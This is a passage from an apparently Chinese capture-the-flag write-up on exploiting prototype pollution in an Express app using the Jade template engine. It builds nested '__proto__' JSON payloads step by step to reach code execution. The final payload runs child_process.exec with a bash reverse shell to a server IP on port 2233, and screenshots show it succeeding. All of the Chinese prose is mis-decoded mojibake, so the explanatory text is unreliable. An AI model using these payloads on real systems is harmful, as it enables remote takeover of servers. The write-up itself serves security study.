-&gt; this.visit(this.node)</li><li>jade/lib/compiler.js :: this.visit</li><li>jade/lib/compiler.js :: this.buf.push</li></ol></li></ol></li><li><ol><li>jade/lib/index.js :: parse -&gt; options.self</li><li>jade/lib/index.js :: fn = new Function(â€˜locals, jadeâ€™, fn)</li><li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li></ol></li></ol><p>è‡³ 4. a. iii. è¿™éƒ¨åˆ†è°ƒç”¨æ ˆç”¨ä¸‹å›¾ï¼Œ4. b. c. d. çš„åœ¨ä¸Šé¢ debug ä¹Ÿæœ‰æåŠï¼Œå› æ­¤è°ƒç”¨æ ˆè¿™éƒ¨åˆ†é—®é¢˜ä¸å¤§</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619877575256-25b06a25-1dc6-494a-a348-a8929ec5b81e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619877575256-25b06a25-1dc6-494a-a348-a8929ec5b81e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>é—®é¢˜æœ‰ 3</p><ol><li><code>visit</code> æ–¹æ³•ä¸­ <code>this.debug=true</code> ï¼Œä¸ç„¶ <code>this.buf.push</code> è°ƒç”¨ä¸äº†</li><li>åœ¨ä¸Šé¢æåˆ°çš„ï¼š<code>node.line</code> åœ¨æŸå¤„ä¸º <code>undefined</code> æ‰è¡Œï¼Œä¸ç„¶æˆ‘ä»¬æ±¡æŸ“çš„ <code>Object</code> å¯¹è±¡å°±æ²¡æ„ä¹‰</li><li>ä¿è¯èƒ½å¤Ÿæ‰§è¡Œåˆ°æ¸²æŸ“é˜¶æ®µï¼Œå› ä¸ºè¦†ç›–æŸäº›å±æ€§ä¼šå¯¼è‡´è«åå…¶å¦™çš„å¼‚å¸¸</li></ol><p>ç¬¬ 1 ä¸ªé—®é¢˜å®¹æ˜“è§£å†³ï¼Œå› ä¸ºåœ¨ Jade å…¥å£ <code>exports.__express</code> ï¼Œæˆ‘ä»¬ä¸Šé¢ deubg åˆ†ææ—¶ä¹Ÿçœ‹åˆ°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.__express = <span class="function"><span class="keyword">function</span> (<span class="params">path, options, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (options.compileDebug == <span class="literal">undefined</span> &amp;&amp; process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    options.compileDebug = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exports</span>.renderFile(path, options, fn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>options.compileDebug</code> æ— åˆå§‹å€¼ï¼Œå¯ä»¥è¦†ç›–å¼€å¯ Debug æ¨¡å¼ï¼ˆç»åˆ†æï¼Œ<code>this.debug</code> è·å–çš„å°±æ˜¯è¿™é‡Œçš„ debug å€¼ï¼‰ï¼Œå½“ç„¶ä¹Ÿæœ‰å¦å¤–ä¸€ç§æƒ…å†µï¼Œéƒ¨ç½²æ—¶ï¼Œæ²¡æœ‰æ­£ç¡®é…ç½® <code>req.app.get(&#39;env&#39;)</code>  å¯¼è‡´ debug æ¨¡å¼å¼€å¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡ä¹Ÿå¯ä»¥ä¸ç”¨è¦†ç›–ï¼Œä½†ä¸ºäº†ç¡®ä¿é€šç”¨æ€§ï¼Œè¿™é‡Œè¿˜æ˜¯è¦†ç›–ä¸€ä¸‹ï¼Œé˜²æ­¢æ­£ç¡®é…ç½®ï¼Œ2333ã€‚</p><p>è¿™é‡Œå›  <code>utils.copy(user.userinfo,req.body);</code> ä¸ web341ä¸€æ ·ï¼Œ<code>userinfo.__proto__.__proto__</code> æ‰æ˜¯ <code>Object</code> å¯¹è±¡çš„åŸå‹ï¼Œæ‰€ä»¥è¦å¥—ä¸¤å±‚ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæ‰“ä¸€ä¸‹</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116128748-ac570d67-cac5-468c-a273-a43812c73435.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116128748-ac570d67-cac5-468c-a273-a43812c73435.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç¬¬ 3 ä¸ªé—®é¢˜æå‰å‡ºç°äº†ï¼Œè¦å…ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¿è¯ä»£ç èƒ½å¤Ÿæ‰§è¡Œåˆ°æ¸²æŸ“é˜¶æ®µ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116131082-927af231-aa69-4d7f-a1fa-d1bd6eb1d180.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116131082-927af231-aa69-4d7f-a1fa-d1bd6eb1d180.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å’Œå…ˆçŸ¥æ–‡ç« é‡Œä¸åŒï¼Œè¿™é‡ŒæŠ¥é”™æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå…ˆè·Ÿè¿› <code>Compiler.visitNode</code> 225è¡Œçœ‹ä¸€ä¸‹</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116541915-a5c6af43-8a65-453d-9995-a31a66b54457.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116541915-a5c6af43-8a65-453d-9995-a31a66b54457.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æ‹¼æ¥ä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116560928-00141f65-8124-4d8b-b9b3-4f70b435b057.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116560928-00141f65-8124-4d8b-b9b3-4f70b435b057.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>åœ¨éå†ASTæ ‘æ—¶ï¼Œé€šå¸¸æ˜¯é€šè¿‡ <code>&quot;visit&quot; + èŠ‚ç‚¹ç±»å‹</code> æ¥éå†æ‰€æœ‰èŠ‚ç‚¹çš„ï¼Œè§‚å¯Ÿé”™è¯¯è°ƒç”¨æ ˆä¹ŸçŸ¥ï¼Œæ¯”å¦‚ <code>visitBlock</code>ï¼Œå°±æ˜¯è®¿é—® <code>Block</code> èŠ‚ç‚¹ã€‚é‚£ <code>Block</code> å¯ç”¨ï¼Œæˆ‘ä»¬å°±æ±¡æŸ“ä¸€ä¸‹ <code>type</code> å°±å¥½äº†ï¼Œå½“å®ƒå½“å‰ä¸Šä¸‹æ–‡æ‰¾ä¸åˆ°å°±å»æ‰¾ <code>Object</code> äº†ã€‚</p><p>å½“ç„¶é€‰å–æ—¶ï¼Œæœ€å¥½æ˜¯é€‰çš„èŠ‚ç‚¹é™„å¸¦çš„ä¸Šä¸‹æ–‡ä¿¡æ¯è¿›å…¥åï¼Œå•¥äº‹ä¹Ÿä¸ä¼šåšçš„ï¼Œä¸ç„¶ä¹Ÿæœ‰èµ°å‘å¥‡å¥‡æ€ªæ€ªçš„é€»è¾‘ï¼Œå…ˆæ¥çœ‹çœ‹ Block èŠ‚ç‚¹ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117442355-58168bea-2ae8-40a5-a38f-9f38e145a384.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117442355-58168bea-2ae8-40a5-a38f-9f38e145a384.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è¿™é‡ŒåŠ ä¸Šè¿™éƒ¨åˆ†é€»è¾‘ï¼Œæ¥çœ‹çœ‹æˆ‘ä»¬æ•…æ„ä¼ªé€  Block èŠ‚ç‚¹ä¼šå‘ç”Ÿä»€ä¹ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (node.type == <span class="literal">undefined</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>[<span class="string">&#x27;visit&#x27;</span> + <span class="string">&#x27;Block&#x27;</span>](node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117969224-9896faed-6f7b-49dd-a4b5-63c9d642847f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117969224-9896faed-6f7b-49dd-a4b5-63c9d642847f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è¿™é‡Œ <code>block.nodes</code> ä¸º <code>undefined</code> ï¼Œç„¶å <code>undefined.length</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118021804-559e7fb3-5448-494e-a38d-743f1c1e2dcb.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118021804-559e7fb3-5448-494e-a38d-743f1c1e2dcb.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æ˜æ˜¾ï¼Œè¿™æ ·è®¿é—®ä¼šæŠ¥é”™ï¼Œå¯¼è‡´è¿›å…¥å…¶ä»–é”™è¯¯ï¼Œç„¶å <code>jade</code> æ²¡æœ‰å¯¹è¿™å—å¼‚å¸¸è¿›è¡Œå¤„ç†ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ <code>vist</code> çš„èŠ‚ç‚¹ä¸æ˜¯è¿™ç§ <code>block.å­å±æ€§.å­™å­å±æ€§</code> é—®é¢˜åº”è¯¥ä¸å¤§ã€‚é¡¶å¤šä¸€ä¸ª <code>undefined</code> ç„¶åç›´æ¥ç»“æŸå•¥çš„ï¼Œè¿™é‡Œè¯•è¯• <code>visitCode</code> ï¼Œ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118172963-52ab2681-b97c-4b38-82f3-bf3255b5820d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118172963-52ab2681-b97c-4b38-82f3-bf3255b5820d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æ­£å¸¸èµ°åˆ°åé¢ï¼Œæ²¡æœ‰æŠ¥é”™ï¼ŒæœŸé—´åªè§¦å‘äº† <code>this.buf.push(code.val)</code> ï¼Œé—®é¢˜åº”è¯¥ä¸å¤§ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118198085-93803b1d-f797-4109-89ab-4e61e907c305.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118198085-93803b1d-f797-4109-89ab-4e61e907c305.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å°è¯•æ±¡æŸ“ <code>type</code> ä¸º <code>Code</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118330281-d959454b-3c39-483c-9e4c-f032049d3fed.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118330281-d959454b-3c39-483c-9e4c-f032049d3fed.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å¥½è€¶ï¼Œåƒæ˜¯è§£å†³äº†ï¼Œå› ä¸ºè¿™ä¸ªæŠ¥é”™å’Œå…ˆçŸ¥æ–‡ç« æŠ¥é”™ä¸€è‡´ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118350820-00c93106-f0ac-4934-8b91-5053218496d9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118350820-00c93106-f0ac-4934-8b91-5053218496d9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å°è¯•è§£å†³è¿™ä¸ªæŠ¥é”™ï¼Œå› ä¸ºçœ‹é”™è¯¯è°ƒè¿™é‡Œå¥½åƒè¿˜æ²¡åˆ°æ¸²æŸ“æˆåŠŸçš„åœ°æ–¹ã€‚</p><p>åˆ†æè¿™ä¸ªé”™è¯¯æ ˆï¼Œå¯ä»¥çœ‹åˆ°å‰ 4 ç‚¹è¿˜æ˜¯å±äº <code>jade</code> èŒƒç•´ã€‚å…ˆè·Ÿè¿› <code>jade</code> æ¨¡å—æœ€åæŠ¥é”™çš„åœ°æ–¹ï¼Œå³ <code>jade/libindex.js</code> 149è¡Œçš„ <code>parse</code> æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118955171-5adf4d74-799a-49da-b808-a290a2b432f0.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118955171-5adf4d74-799a-49da-b808-a290a2b432f0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å‘ç°ï¼Œç¨‹åºå·²ç»èµ°å®ŒåˆšåˆšASTéå†éƒ¨åˆ†äº†ï¼Œå·²ç»å·®ä¸å¤šè¦è¿”å›äº†ã€‚</p><p>æ„Ÿè§‰åªè¦é¿å…è¿›å…¥149è¡Œçš„ <code>addWith</code> æ–¹æ³•ï¼Œå°±å¯ä»¥æ¸²æŸ“æˆåŠŸäº†ï¼</p><p>ç„¶åè¿›å…¥149è¡Œçš„ <code>addWith</code> æ–¹æ³•æ˜¯æ»¡è¶³147è¡Œçš„ <code>options.self</code> å€¼ä¸º Falseï¼Œå°è¯•ä¸‹çœ‹çœ‹è¿™ä¸ª <code>options.self</code> é»˜è®¤æ˜¯ä¸æ˜¯ <code>undefined</code>ï¼Œå¦‚æœæ˜¯å°±å¯ä»¥æ±¡æŸ“äº†ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119251617-e365f480-5242-4820-b69e-ce699e0bb915.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119251617-e365f480-5242-4820-b69e-ce699e0bb915.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>niceï¼Œå°±æ˜¯ <code>undefined</code> ï¼Œå°è¯•æ±¡æŸ“ <code>self</code> ä¸º <code>true</code> ï¼Œ<code>1</code> ä¹Ÿå¯ä»¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119423983-2f7f92e0-cf5c-4e61-974c-a7b07af0edd4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119423983-2f7f92e0-cf5c-4e61-974c-a7b07af0edd4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119438729-f49f92be-360a-46f7-9d70-e8299187bcaf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119438729-f49f92be-360a-46f7-9d70-e8299187bcaf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ï¼ï¼ï¼ç»ˆäºèµ°åˆ°æ¸²æŸ“è¿™ä¸€æ­¥äº†ï¼</p><p>çœ‹åˆ° <code>undefined</code> å¥½è¯´ï¼Œæ±¡æŸ“å°±å®Œäº‹äº† ï¼ˆ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;tari&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™ index çš„é¡µé¢æ¸²æŸ“å°±æ²¡å•¥é—®é¢˜äº†ï¼Œåˆ° ç¬¬ 2 ä¸ªé—®é¢˜ï¼Œ<code>node.line</code> åœ¨æŸå¤„ä¸º <code>undefined</code> æ‰è¡Œï¼Œä¸ç„¶æˆ‘ä»¬æ±¡æŸ“çš„ <code>Object</code> å¯¹è±¡å°±æ²¡æ„ä¹‰</p><p>è¿™é‡Œå¦‚æœä¸€æ­¥ä¸€æ­¥åŠ¨æ€è°ƒè¯•ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥æ³¨å…¥æµ‹è¯•å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619878355583-fa6a99d2-3f52-4621-8f22-e9e41af3f303.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619878355583-fa6a99d2-3f52-4621-8f22-e9e41af3f303.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"> </p><p>å‘ç°éƒ½ <code>node</code> ä¸º <code>Block</code> çš„æ—¶å€™ <code>line</code> æ˜¯ä¸å­˜åœ¨çš„ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619882616884-efc76041-dad6-40e9-b868-f51b2f5347c0.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619882616884-efc76041-dad6-40e9-b868-f51b2f5347c0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç†è®ºä¸Šï¼Œåªè¦è¦†ç›–äº† <code>node.line</code> å³å¯è¾¾åˆ°ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚</p><p>ç„¶åæ‹¼æ¥ä¸Šé¢é¿å…æŠ¥é”™çš„å‚æ•°ï¼Œå¾—åˆ°</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;tari&quot;</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/2233&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>åå¼¹ Shell</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134887089-f7c6069a-6fb6-4cd2-b050-9e458e569844.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134887089-f7c6069a-6fb6-4cd2-b050-9e458e569844.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å† POSTä¸€æ¬¡ï¼Œå‘é€çš„æ•°æ®åŒ…ä¸ç”¨å˜</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134804938-2c7f05ad-0f34-478e-89d9-03f6c739b1ec.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134804938-2c7f05ad-0f34-478e-89d9-03f6c739b1ec.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¸å°±å°‘äº†ä¸ª <code>message</code>ï¼Œé‚£æˆ‘æ±¡æŸ“ä½ å‘—ï¼Œï¼Œç„¶å <code>message</code> ååˆè¯´å°‘äº† <code>error</code> ç»§ç»­æ±¡æŸ“ï¼Œç„¶å <code>error</code> æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå°±éœ€è¦å¼„ä¸ª <code>json</code> æ ¼å¼æ•°æ®å•¦ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135004859-7389888a-d8f0-4621-a7d6-9bf2921c0ebe.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135004859-7389888a-d8f0-4621-a7d6-9bf2921c0ebe.png?x-oss-process=image/resize,w_1500" 